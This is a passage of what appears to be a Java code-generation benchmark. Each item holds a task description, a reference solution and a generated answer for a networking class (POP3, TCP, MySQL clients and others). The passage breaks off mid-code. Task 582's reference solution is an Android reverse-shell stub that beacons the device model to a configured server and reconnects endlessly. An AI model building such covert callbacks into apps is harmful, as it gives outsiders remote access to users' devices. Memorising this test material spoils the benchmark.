    "Canonical_solution": "import android.os.AsyncTask;\nimport org.json.JSONObject;\nimport java.io.BufferedInputStream;\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestHandler {\n\n    public static class MyAsyncTaskgetNews extends AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... params) {\n            try {\n                String NewsData;\n                URL url = new URL(params[0]);\n                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();\n                urlConnection.setConnectTimeout(7000);\n\n                try {\n                    InputStream in = new BufferedInputStream(urlConnection.getInputStream());\n                    NewsData = ConvertInputToStringNoChange(in);\n                    publishProgress(NewsData);\n                } finally {\n                    urlConnection.disconnect();\n                }\n            } catch (Exception ex) {}\n            return null;\n        }\n\n        protected void onProgressUpdate(String... progress) {\n            try {\n                JSONObject json = new JSONObject(progress[0]);\n            } catch (Exception ex) {}\n        }\n    }\n\n    public static String ConvertInputToStringNoChange(InputStream inputStream) {\n        BufferedReader bureader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        String linereultcal = \"\";\n\n        try {\n            while((line = bureader.readLine()) != null) {\n                linereultcal += line;\n            }\n            inputStream.close();\n        } catch (Exception ex) {}\n\n        return linereultcal;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport android.os.AsyncTask;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestHandler {\n\n    public static class MyAsyncTaskgetNews extends AsyncTask<String, Void, String> {\n\n        @Override\n        protected String doInBackground(String... params) {\n            if (params.length == 0) return null;\n            String result = \"\";\n            try {\n                URL url = new URL(params[0]);\n                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();\n                urlConnection.setRequestMethod(\"GET\");\n                urlConnection.setConnectTimeout(7000);\n                urlConnection.connect();\n\n                InputStream inputStream = urlConnection.getInputStream();\n                result = ConvertInputToStringNoChange(inputStream);\n                inputStream.close();\n                urlConnection.disconnect();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            publishProgress(); // For JSON processing in onProgressUpdate\n            return result;\n        }\n\n        @Override\n        protected void onProgressUpdate(Void... values) {\n            super.onProgressUpdate(values);\n            // Process the JSON response here or notify the UI thread\n        }\n    }\n\n    public static String ConvertInputToStringNoChange(InputStream inputStream) {\n        StringBuilder resultStringBuilder = new StringBuilder();\n        try (BufferedReader br = new BufferedReader(new InputStreamReader(inputStream))) {\n            String line;\n            while ((line = br.readLine()) != null) {\n                resultStringBuilder.append(line).append(\"\\n\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return resultStringBuilder.toString();\n    }\n}\n```"
  },
  {
    "Task_id": 570,
    "Instruction": "Task Description: Implement a POP3 client connection class in Java that handles socket communication with a POP3 server, including connection establishment, data transmission, and resource cleanup.\n\nClass Description: The Pop3Connection class provides functionality to connect to a POP3 server using TCP sockets, send and receive data through input/output streams, and manage the connection lifecycle.\n\nAttributes:\n- socket: Socket - The TCP socket used for communication with the server\n- in: BufferedInputStream - Input stream for reading data from the server\n- out: BufferedOutputStream - Output stream for writing data to the server\n\nMethods:\n- connect() -> Socket - Establishes a connection to the POP3 server by trying all available IP addresses for the host\n- connectToAddress(InetAddress address) -> Socket - Creates and connects a socket to a specific server address\n- open() -> void - Opens the connection by initializing socket and streams, throws MessagingException on failure\n- isOpen() -> boolean - Checks if the connection is currently active and valid\n- close() -> void - Closes all connection resources (socket and streams)\n- writeLine(String s) -> void - Writes a line of text to the server (appends CRLF)\n- readLine() -> String - Reads a line of text from the server (handles CRLF line endings)",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\nclass Pop3Connection {\n    private Socket socket;\n    private BufferedInputStream in;\n    private BufferedOutputStream out;\n\n    private Socket connect() throws IOException, UnknownHostException {\n        InetAddress[] inetAddresses = InetAddress.getAllByName(settings.getHost());\n        IOException connectException = null;\n        for (InetAddress address : inetAddresses) {\n            try {\n                return connectToAddress(address);\n            } catch (IOException e) {\n                connectException = e;\n            }\n        }\n        throw connectException != null ? connectException : new UnknownHostException();\n    }\n\n    private Socket connectToAddress(InetAddress address) throws IOException {\n        InetSocketAddress socketAddress = new InetSocketAddress(address, settings.getPort());\n        final Socket socket = new Socket();\n        socket.connect(socketAddress, SOCKET_CONNECT_TIMEOUT);\n        return socket;\n    }\n\n    void open() throws MessagingException {\n        try {\n            socket = connect();\n            in = new BufferedInputStream(socket.getInputStream(), 1024);\n            out = new BufferedOutputStream(socket.getOutputStream(), 512);\n            socket.setSoTimeout(SOCKET_READ_TIMEOUT);\n            if (!isOpen()) {\n                throw new MessagingException(\"Unable to connect socket\");\n            }\n        } catch (IOException ioe) {\n            close();\n            throw new MessagingException(\"Unable to open connection to POP server.\", ioe);\n        }\n    }\n\n    boolean isOpen() {\n        return (in != null && out != null && socket != null\n                && socket.isConnected() && !socket.isClosed());\n    }\n\n    void close() {\n        try {\n            in.close();\n        } catch (Exception e) {}\n        try {\n            out.close();\n        } catch (Exception e) {}\n        try {\n            socket.close();\n        } catch (Exception e) {}\n        in = null;\n        out = null;\n        socket = null;\n    }\n\n    private void writeLine(String s) throws IOException {\n        out.write(s.getBytes());\n        out.write('\\r');\n        out.write('\\n');\n        out.flush();\n    }\n\n    String readLine() throws IOException {\n        StringBuilder sb = new StringBuilder();\n        int d = in.read();\n        if (d == -1) {\n            throw new IOException(\"End of stream reached while trying to read line.\");\n        }\n        do {\n            if (((char)d) == '\\r') {\n                continue;\n            } else if (((char)d) == '\\n') {\n                break;\n            } else {\n                sb.append((char)d);\n            }\n        } while ((d = in.read()) != -1);\n        return sb.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\n\npublic class Pop3Connection {\n    private Socket socket;\n    private BufferedInputStream in;\n    private BufferedOutputStream out;\n\n    public Socket connect(String host, int port) throws IOException {\n        InetAddress[] addresses = InetAddress.getAllByName(host);\n        for (InetAddress address : addresses) {\n            try {\n                return connectToAddress(address, port);\n            } catch (IOException e) {\n                // Continue trying other addresses\n            }\n        }\n        throw new IOException(\"Could not connect to any IP address for \" + host);\n    }\n\n    private Socket connectToAddress(InetAddress address, int port) throws IOException {\n        Socket socket = new Socket();\n        socket.connect(new InetSocketAddress(address, port), 10000); // 10 seconds timeout\n        return socket;\n    }\n\n    public void open(String host, int port) throws IOException, MessagingException {\n        try {\n            socket = connect(host, port);\n            in = new BufferedInputStream(socket.getInputStream());\n            out = new BufferedOutputStream(socket.getOutputStream());\n        } catch (IOException e) {\n            close();\n            throw new MessagingException(\"Failed to open POP3 connection\", e);\n        }\n    }\n\n    public boolean isOpen() {\n        return socket != null && !socket.isClosed() && socket.isConnected() &&\n               !socket.isInputShutdown() && !socket.isOutputShutdown();\n    }\n\n    public void close() {\n        try {\n            if (in != null) in.close();\n        } catch (IOException ignored) {}\n        try {\n            if (out != null) out.close();\n        } catch (IOException ignored) {}\n        try {\n            if (socket != null && !socket.isClosed()) socket.close();\n        } catch (IOException ignored) {}\n    }\n\n    public void writeLine(String s) throws IOException {\n        if (s == null) {\n            out.write((\"\\r\\n\").getBytes());\n        } else {\n            out.write(s.getBytes());\n            out.write((\"\\r\\n\").getBytes());\n        }\n        out.flush();\n    }\n\n    public String readLine() throws IOException {\n        StringBuilder sb = new StringBuilder();\n        int c;\n        while ((c = in.read()) != -1) {\n            if (c == '\\r') {\n                int next = in.read();\n                if (next == '\\n') {\n                    break;\n                } else {\n                    sb.append((char) c).append((char) next);\n                }\n            } else {\n                sb.append((char) c);\n            }\n        }\n        return sb.toString();\n    }\n}\n\nclass MessagingException extends Exception {\n    public MessagingException(String message, Throwable cause) {\n        super(message, cause);\n    }\n}\n```"
  },
  {
    "Task_id": 571,
    "Instruction": "Task Description: Create a TCP client class that establishes a connection to a server, sends requests, receives responses, and manages the connection lifecycle.\n\nClass Description: TcpRequester is a TCP client implementation that handles communication with a server using sockets. It provides methods to start/stop the connection, send requests, and fetch responses. The class manages socket resources and includes error handling for network operations.\n\nAttributes:\n- sock: Socket - The socket instance used for TCP communication  \n- in: InputStream - Input stream for reading server responses  \n- out: OutputStream - Output stream for sending requests to the server  \n- dest: SocketAddress - The server address to connect to  \n- request: String - The initial request string  \n- passcode: String - Authentication passcode  \n- on_rsp: Consumer<ByteArray> - Callback for handling responses  \n\nMethods:\n- start(InetAddress bind_addr, long timeout, int ttl) -> T - Establishes a socket connection to the server with specified timeout and TTL  \n- stop() -> T - Closes the socket and releases all resources  \n- isRunning() -> boolean - Checks if the connection is active  \n- sendRequest(byte[] request) -> T - Sends a byte array request to the server  \n- fetchResponse() -> ByteArray - Reads and returns the server response as a ByteArray",
    "Canonical_solution": "import org.jgroups.util.ByteArray;\nimport org.jgroups.util.Util;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.SocketAddress;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport java.util.function.Consumer;\n\nprotected class TcpRequester extends Requester {\n    protected Socket       sock;\n    protected InputStream  in;\n    protected OutputStream out;\n\n    protected TcpRequester(SocketAddress dest, String request, String passcode,\n                           Consumer<ByteArray> on_rsp) {\n        super(dest, request, passcode, on_rsp);\n    }\n\n    protected <T extends Requester> T start(InetAddress bind_addr, long timeout, int ttl) throws IOException {\n        sock=new Socket();\n        sock.setSoTimeout((int)timeout);\n        sock.bind(new InetSocketAddress(bind_addr, 0));\n        sock.connect(dest);\n        in=sock.getInputStream();\n        out=sock.getOutputStream();\n        return (T)this;\n    }\n\n    protected <T extends Requester> T stop() {\n        Util.close(sock,in,out);\n        return (T)this;\n    }\n\n    protected boolean isRunning() {\n        return sock != null && !sock.isClosed();\n    }\n\n    protected <T extends Requester> T sendRequest(byte[] request) throws IOException {\n        out.write(request);\n        out.write('\\n');\n        return (T)this;\n    }\n\n    protected ByteArray fetchResponse() {\n        byte[] buf=new byte[1024];\n        int    index=0;\n\n        for(;;) {\n            try {\n                int bytes_read=in.read(buf, index, buf.length - index);\n                if(bytes_read == -1) {\n                    if(index > 0)\n                        break;\n                    return null;\n                }\n                index+=bytes_read;\n                if(index >= buf.length) {\n                    byte[] tmp=new byte[buf.length + 1024];\n                    System.arraycopy(buf, 0, tmp, 0, index);\n                    buf=tmp;\n                }\n            }\n            catch(IOException e) {\n                break;\n            }\n        }\n        return new ByteArray(buf, 0, index);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.nio.ByteBuffer;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.function.Consumer;\n\npublic class TcpRequester<T> {\n    protected Socket sock;\n    protected InputStream in;\n    protected OutputStream out;\n    protected SocketAddress dest;\n    protected String request;\n    protected String passcode;\n    protected Consumer<ByteArray> on_rsp;\n    private final AtomicBoolean running = new AtomicBoolean(false);\n\n    public T start(InetAddress bind_addr, long timeout, int ttl) throws IOException {\n        sock = new Socket();\n        sock.setSoTimeout((int) timeout);\n        if (bind_addr != null) {\n            sock.bind(new InetSocketAddress(bind_addr, 0));\n        }\n        sock.connect(dest, (int) timeout);\n        sock.setTcpNoDelay(true);\n        sock.setKeepAlive(true);\n        sock.setTrafficClass(ttl);\n        sock.getOutputStream().write(passcode.getBytes());\n        in = sock.getInputStream();\n        out = sock.getOutputStream();\n        running.set(true);\n        return (T) this;\n    }\n\n    public T stop() {\n        running.set(false);\n        try {\n            if (in != null) in.close();\n            if (out != null) out.close();\n            if (sock != null) sock.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return (T) this;\n    }\n\n    public boolean isRunning() {\n        return running.get();\n    }\n\n    public T sendRequest(byte[] request) throws IOException {\n        if (!running.get()) throw new IOException(\"Connection not active\");\n        out.write(request);\n        out.flush();\n        return (T) this;\n    }\n\n    public ByteArray fetchResponse() throws IOException {\n        if (!running.get()) throw new IOException(\"Connection not active\");\n        byte[] buffer = new byte[1024];\n        int bytesRead;\n        ByteArrayOutputStream responseStream = new ByteArrayOutputStream();\n        while ((bytesRead = in.read(buffer)) != -1) {\n            responseStream.write(buffer, 0, bytesRead);\n        }\n        return new ByteArray(responseStream.toByteArray());\n    }\n\n    public static class ByteArray {\n        private final byte[] data;\n\n        public ByteArray(byte[] data) {\n            this.data = data;\n        }\n\n        public byte[] getBytes() {\n            return data;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 575,
    "Instruction": "Task Description: Implement a Java class that establishes a TCP client connection to a server, sends a command, and retrieves the server's response using socket programming.\n\nClass Description: The FourLetterCommand class provides functionality to connect to a server, send a command string, and receive the server's response. It handles socket creation, connection, data transmission, and resource cleanup.\n\nAttributes:\n- host: String - The hostname or IP address of the server to connect to\n- port: int - The port number on which the server is listening\n\nMethods:\n- FourLetterCommand(String host, int port) -> None - Constructor that initializes the host and port attributes\n- request(String command) -> String - Establishes a connection to the server, sends the command, and returns the server's response\n- response(Socket client) -> String - Reads the server's response from the socket input stream and returns it as a string\n- cleanup(Closeable c) -> void - Closes the provided Closeable resource (socket or stream) and handles any IOExceptions silently",
    "Canonical_solution": "import java.io.*;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\n\npublic class FourLetterCommand {\n\n    private String host;\n    private int port;\n\n    public FourLetterCommand(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public String request(String command) {\n        final Socket socket = new Socket();\n        try {\n            socket.connect(new InetSocketAddress(host, port));\n            OutputStream outputStream = socket.getOutputStream();\n            outputStream.write(command.getBytes());\n            outputStream.flush();\n            return response(socket);\n        } catch (IOException e) {\n            throw new IllegalStateException(e);\n        }\n    }\n\n    private String response(Socket client) {\n        try {\n            var reader = new BufferedReader(new InputStreamReader(client.getInputStream()));\n            var builder = new StringBuilder(\"\");\n            String str;\n            while ((str = reader.readLine()) != null) {\n                builder.append(str).append(\"\\n\");\n            }\n            cleanup(client);\n            return builder.toString();\n        } catch (Exception e) {\n            throw new IllegalStateException(e);\n        }\n    }\n\n    private void cleanup(Closeable c) {\n        if (c != null) {\n            try {\n                c.close();\n            } catch (IOException e) {\n                // ignore\n            }\n        }\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class FourLetterCommand {\n    private String host;\n    private int port;\n\n    public FourLetterCommand(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public String request(String command) {\n        Socket client = null;\n        try {\n            client = new Socket();\n            client.connect(new InetSocketAddress(host, port));\n            OutputStream out = client.getOutputStream();\n            PrintWriter writer = new PrintWriter(out);\n            writer.write(command);\n            writer.flush();\n            return response(client);\n        } catch (IOException e) {\n            return \"Error: \" + e.getMessage();\n        } finally {\n            cleanup(client);\n        }\n    }\n\n    private String response(Socket client) {\n        StringBuilder sb = new StringBuilder();\n        try (InputStream in = client.getInputStream();\n             BufferedReader reader = new BufferedReader(new InputStreamReader(in))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                sb.append(line).append(\"\\n\");\n            }\n        } catch (IOException e) {\n            return \"Error reading response: \" + e.getMessage();\n        }\n        return sb.toString();\n    }\n\n    private void cleanup(Closeable c) {\n        if (c != null) {\n            try {\n                c.close();\n            } catch (IOException ignored) {\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 577,
    "Instruction": "Task Description: Implement a MySQL client channel class in Java that handles TCP socket communication with a MySQL server, including connection management, query execution, and packet handling.\n\nClass Description: MySQLChannel is a final class that provides a TCP-based communication channel to interact with a MySQL server. It manages socket connections, executes SQL queries, and handles MySQL protocol packets. The class includes connection configuration, buffer management, and proper resource cleanup.\n\nAttributes:\n- dsc: [DataSourceConfig] - Configuration object containing host, port and other connection parameters\n- socket: [Socket] - TCP socket connection to the MySQL server\n- in: [InputStream] - Buffered input stream for reading server responses\n- out: [OutputStream] - Buffered output stream for sending commands to server\n- isClosed: [AtomicBoolean] - Thread-safe flag indicating whether the channel is closed\n\nMethods:\n- connect(long timeout) -> [void] - Establishes a TCP connection to the MySQL server with specified timeout and configures socket parameters\n- execute(String statement) -> [BinaryPacket] - Executes a SQL query statement and returns the server response as a binary packet\n- receive() -> [BinaryPacket] - Reads and returns a binary packet from the server\n- close() -> [void] - Closes the connection by sending a QUIT command and releasing resources\n- BinaryPacket: [static class] - Represents a MySQL binary packet with data and packet ID\n- CommandPacket: [static class] - Represents a MySQL command packet with packet ID, command type, and arguments\n- MySQLPacket: [static class] - Contains MySQL protocol constants\n- QuitPacket: [static class] - Contains the QUIT command packet data",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic final class MySQLChannel {\n\n    private final DataSourceConfig dsc;\n    private Socket socket;\n    private InputStream in;\n    private OutputStream out;\n    private final AtomicBoolean isClosed;\n\n    public MySQLChannel(DataSourceConfig dsc) {\n        this.dsc = dsc;\n        this.isClosed = new AtomicBoolean(false);\n    }\n\n    public void connect(long timeout) throws Exception {\n        socket = new Socket();\n        socket.setTcpNoDelay(true);\n        socket.setTrafficClass(0x04 | 0x10);\n        socket.setPerformancePreferences(0, 2, 1);\n        socket.setReceiveBufferSize(16 * 1024);\n        socket.setSendBufferSize(8 * 1024);\n        socket.connect(new InetSocketAddress(dsc.getHost(), dsc.getPort()), 10 * 1000);\n\n        in = new BufferedInputStream(socket.getInputStream(), 16 * 1024);\n        out = new BufferedOutputStream(socket.getOutputStream(), 8 * 1024);\n    }\n\n    public BinaryPacket execute(String statement) throws IOException {\n        CommandPacket packet = new CommandPacket();\n        packet.packetId = 0;\n        packet.command = MySQLPacket.COM_QUERY;\n        packet.arg = statement.getBytes();\n\n        packet.write(out);\n        out.flush();\n        return receive();\n    }\n\n    public BinaryPacket receive() throws IOException {\n        BinaryPacket bin = new BinaryPacket();\n        bin.read(in);\n        return bin;\n    }\n\n    @Override\n    public void close() {\n        if (isClosed.compareAndSet(false, true)) {\n            try {\n                if (out != null) {\n                    out.write(QuitPacket.QUIT);\n                    out.flush();\n                }\n            } catch (IOException e) {\n                // Log error if needed\n            } finally {\n                try {\n                    socket.close();\n                } catch (Throwable e) {\n                    // Log error if needed\n                }\n            }\n        }\n    }\n\n    private static class BinaryPacket {\n        public byte[] data;\n        public int packetId;\n\n        public void read(InputStream in) throws IOException {\n            // Implementation of packet reading\n        }\n    }\n\n    private static class CommandPacket {\n        public int packetId;\n        public byte command;\n        public byte[] arg;\n\n        public void write(OutputStream out) throws IOException {\n            // Implementation of packet writing\n        }\n    }\n\n    private static class MySQLPacket {\n        public static final byte COM_QUERY = 0x03;\n    }\n\n    private static class QuitPacket {\n        public static final byte[] QUIT = new byte[]{0x01, 0x00, 0x00, 0x00, 0x01};\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\nfinal class MySQLChannel {\n    private final DataSourceConfig dsc;\n    private Socket socket;\n    private InputStream in;\n    private OutputStream out;\n    private final AtomicBoolean isClosed = new AtomicBoolean(false);\n\n    public MySQLChannel(DataSourceConfig dsc) {\n        this.dsc = dsc;\n    }\n\n    public void connect(long timeout) throws IOException {\n        if (isClosed.get()) throw new IOException(\"Connection already closed\");\n\n        socket = new Socket();\n        socket.connect(new InetSocketAddress(dsc.getHost(), dsc.getPort()), (int) timeout);\n        socket.setKeepAlive(true);\n        socket.setTcpNoDelay(true);\n\n        in = new BufferedInputStream(socket.getInputStream());\n        out = new BufferedOutputStream(socket.getOutputStream());\n    }\n\n    public BinaryPacket execute(String statement) throws IOException {\n        if (isClosed.get()) throw new IOException(\"Connection already closed\");\n\n        CommandPacket cmdPacket = new CommandPacket((byte) 0, MySQLPacket.COM_QUERY, statement.getBytes());\n        byte[] packetData = cmdPacket.toByteArray();\n\n        out.write(packetData);\n        out.flush();\n\n        return receive();\n    }\n\n    public BinaryPacket receive() throws IOException {\n        if (isClosed.get()) throw new IOException(\"Connection already closed\");\n\n        int payloadLength = in.read() & 0xFF;\n        int seqId = in.read() & 0xFF;\n\n        byte[] payload = new byte[payloadLength];\n        in.read(payload);\n\n        return new BinaryPacket(seqId, payload);\n    }\n\n    public void close() throws IOException {\n        if (!isClosed.compareAndSet(false, true)) return;\n\n        try {\n            sendQuitCommand();\n        } finally {\n            try {\n                if (in != null) in.close();\n            } finally {\n                if (out != null) out.close();\n            }\n            finally {\n                if (socket != null && !socket.isClosed()) socket.close();\n            }\n        }\n    }\n\n    private void sendQuitCommand() throws IOException {\n        QuitPacket quitPacket = new QuitPacket();\n        byte[] packetData = quitPacket.toByteArray();\n\n        if (out != null) {\n            out.write(packetData);\n            out.flush();\n        }\n    }\n\n    static class BinaryPacket {\n        private final int packetId;\n        private final byte[] data;\n\n        BinaryPacket(int packetId, byte[] data) {\n            this.packetId = packetId;\n            this.data = data;\n        }\n\n        public int getPacketId() {\n            return packetId;\n        }\n\n        public byte[] getData() {\n            return data;\n        }\n    }\n\n    static class CommandPacket {\n        private final byte packetId;\n        private final byte command;\n        private final byte[] arguments;\n\n        CommandPacket(byte packetId, byte command, byte[] arguments) {\n            this.packetId = packetId;\n            this.command = command;\n            this.arguments = arguments;\n        }\n\n        byte[] toByteArray() {\n            ByteArrayOutputStream baos = new ByteArrayOutputStream();\n            int length = arguments.length + 1;\n            baos.write(length & 0xFF);\n            baos.write(packetId & 0xFF);\n            baos.write(command);\n            baos.write(arguments);\n            return baos.toByteArray();\n        }\n    }\n\n    static class MySQLPacket {\n        static final byte COM_QUERY = 3;\n    }\n\n    static class QuitPacket {\n        byte[] toByteArray() {\n            return new byte[]{0x05, 0x00, MySQLPacket.COM_QUERY, 0x03, 'Q', 'U', 'I', 'T'};\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 582,
    "Instruction": "Task Description: Create a TCP client class that establishes and maintains a persistent connection to a server, handles communication, and automatically reconnects on failure.\n\nClass Description: The `tcpConnection` class is an AsyncTask implementation that manages TCP socket communication in Android. It establishes a persistent connection to a specified server, handles bidirectional communication, and implements automatic reconnection logic when the connection is lost.\n\nAttributes:\n- activity: [Activity] - Reference to the calling Android activity for UI thread operations  \n- context: [Context] - Android context for system operations  \n- TAG: [String] - Logging tag identifier  \n- out: [OutputStream] - Static output stream for sending data to the server  \n\nMethods:\n- tcpConnection([Activity activity], [Context context]) -> [void] - Constructor that initializes the activity and context references  \n- doInBackground([String... strings]) -> [Void] - AsyncTask method that handles the socket connection and communication in the background  \n  - strings[0]: Server IP address  \n  - strings[1]: Server port number  \n  - Returns: null (Void)  \n  - Description:  \n    1. Continuously attempts to establish socket connection with timeout  \n    2. Sets up input/output streams upon successful connection  \n    3. Sends device information as initial message  \n    4. Listens for incoming commands in a loop  \n    5. Handles reconnection automatically on failures  \n    6. Closes connection on \"exit\" command",
    "Canonical_solution": "import android.app.Activity;\nimport android.content.Context;\nimport android.os.AsyncTask;\nimport android.util.Log;\nimport java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.net.SocketTimeoutException;\n\npublic class tcpConnection extends AsyncTask<String,Void,Void> {\n\n    private Activity activity;\n    private Context context;\n    private static String TAG = \"tcpConnectionClass\";\n    public static OutputStream out;\n\n    public tcpConnection(Activity activity, Context context) {\n        this.activity = activity;\n        this.context = context;\n    }\n\n    @Override\n    protected Void doInBackground(String... strings) {\n        Socket socket = null;\n        try {\n            while(true){\n                Log.d(TAG,\"trying\");\n                socket = new Socket();\n                try{\n                    socket.connect(new InetSocketAddress(strings[0], Integer.parseInt(strings[1])),3000);\n                }catch (SocketTimeoutException | SocketException e){\n                    Log.d(TAG,\"error\");\n                    activity.runOnUiThread(() -> new tcpConnection(activity,context).execute(config.IP,config.port));\n                }\n                if(socket.isConnected()){\n                    Log.d(TAG,\"done\");\n                    break;\n                }\n            }\n            out = new DataOutputStream(socket.getOutputStream());\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            String model = android.os.Build.MODEL+\"\\n\";\n            String welcomeMess = \"Hello there, welcome to reverse shell of \"+model;\n            out.write(welcomeMess.getBytes(\"UTF-8\"));\n            \n            String line;\n            while ((line = in.readLine()) != null) {\n                Log.d(TAG, line);\n                if (line.equals(\"exit\")) {\n                    socket.close();\n                    return null;\n                }\n                out.write(\"Unknown Command \\n\".getBytes(\"UTF-8\"));\n            }\n        } catch (Exception e) {\n            activity.runOnUiThread(() -> new tcpConnection(activity,context).execute(config.IP,config.port));\n            e.printStackTrace();\n        }\n        return null;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "right_result": "```java\nimport android.app.Activity;\nimport android.content.Context;\nimport android.os.AsyncTask;\nimport android.util.Log;\n\nimport java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.net.SocketAddress;\nimport java.net.UnknownHostException;\n\npublic class tcpConnection extends AsyncTask<String, String, Void> {\n\n    private Activity activity;\n    private Context context;\n    private static final String TAG = \"tcpConnection\";\n    private static OutputStream out;\n\n    public tcpConnection(Activity activity, Context context) {\n        this.activity = activity;\n        this.context = context;\n    }\n\n    @Override\n    protected Void doInBackground(String... strings) {\n        String serverIP = strings[0];\n        int serverPort = Integer.parseInt(strings[1]);\n\n        while (!isCancelled()) {\n            try {\n                Socket socket = new Socket();\n                SocketAddress address = new InetSocketAddress(serverIP, serverPort);\n                socket.connect(address, 5000);\n\n                InputStream inputStream = socket.getInputStream();\n                BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n\n                OutputStream outputStream = socket.getOutputStream();\n                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(outputStream));\n                out = outputStream;\n\n                String deviceInfo = \"Device Connected: Android\";\n                writer.write(deviceInfo + \"\\n\");\n                writer.flush();\n\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    if (line.equalsIgnoreCase(\"exit\")) {\n                        Log.d(TAG, \"Exit command received. Closing connection.\");\n                        publishProgress(line);\n                        break;\n                    }\n                    publishProgress(line);\n                }\n\n                socket.close();\n\n            } catch (UnknownHostException e) {\n                Log.e(TAG, \"UnknownHostException: \" + e.getMessage());\n            } catch (IOException e) {\n                Log.e(TAG, \"IOException: \" + e.getMessage());\n            } catch (Exception e) {\n                Log.e(TAG, \"Unexpected error: \" + e.getMessage());\n            }\n\n            try {\n                Thread.sleep(5000); // Wait before reconnection attempt\n            } catch (InterruptedException e) {\n                Log.e(TAG, \"Reconnection sleep interrupted: \" + e.getMessage());\n            }\n        }\n        return null;\n    }\n\n    @Override\n    protected void onProgressUpdate(String... values) {\n        super.onProgressUpdate(values);\n        // Handle UI updates here using the activity reference\n    }\n}\n```"
  },
  {
    "Task_id": 583,
    "Instruction": "Task Description: Create a Java class that handles network forwarding for both TCP and UDP protocols, managing connections and data transmission between clients and servers.\n\nClass Description: The NetworkForwarder class is responsible for forwarding network data to a specified destination server using either TCP or UDP protocols. It maintains UDP connections through a DatagramSocket and manages multiple TCP connections using a mapping of source addresses to Socket instances. The class provides methods for forwarding data and disconnecting specific TCP connections.\n\nAttributes:\n- LOGGER: Logger - Used for logging warnings and errors\n- destination: InetAddress - The destination address for forwarded data\n- connectionUdp: DatagramSocket - The UDP socket used for datagram communication\n- connectionsTcp: Map<InetSocketAddress, Socket> - A mapping of source addresses to their corresponding TCP Socket connections\n\nMethods:\n- NetworkForwarder(Config config) -> void - Constructor that initializes the destination address and UDP socket using configuration parameters\n- forward(InetSocketAddress source, int port, boolean datagram, byte[] data) -> void - Forwards data to the destination server using either TCP or UDP protocol based on the datagram parameter\n- disconnect(InetSocketAddress source) -> void - Closes and removes the TCP connection associated with the specified source address",
    "Canonical_solution": "import org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.traccar.config.Config;\nimport org.traccar.config.Keys;\n\nimport jakarta.inject.Inject;\nimport jakarta.inject.Singleton;\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.util.HashMap;\nimport java.util.Map;\n\n@Singleton\npublic class NetworkForwarder {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(NetworkForwarder.class);\n\n    private final InetAddress destination;\n    private final DatagramSocket connectionUdp;\n    private final Map<InetSocketAddress, Socket> connectionsTcp = new HashMap<>();\n\n    @Inject\n    public NetworkForwarder(Config config) throws IOException {\n        destination = InetAddress.getByName(config.getString(Keys.SERVER_FORWARD));\n        connectionUdp = new DatagramSocket();\n    }\n\n    public void forward(InetSocketAddress source, int port, boolean datagram, byte[] data) {\n        try {\n            if (datagram) {\n                connectionUdp.send(new DatagramPacket(data, data.length, destination, port));\n            } else {\n                Socket connectionTcp = connectionsTcp.get(source);\n                if 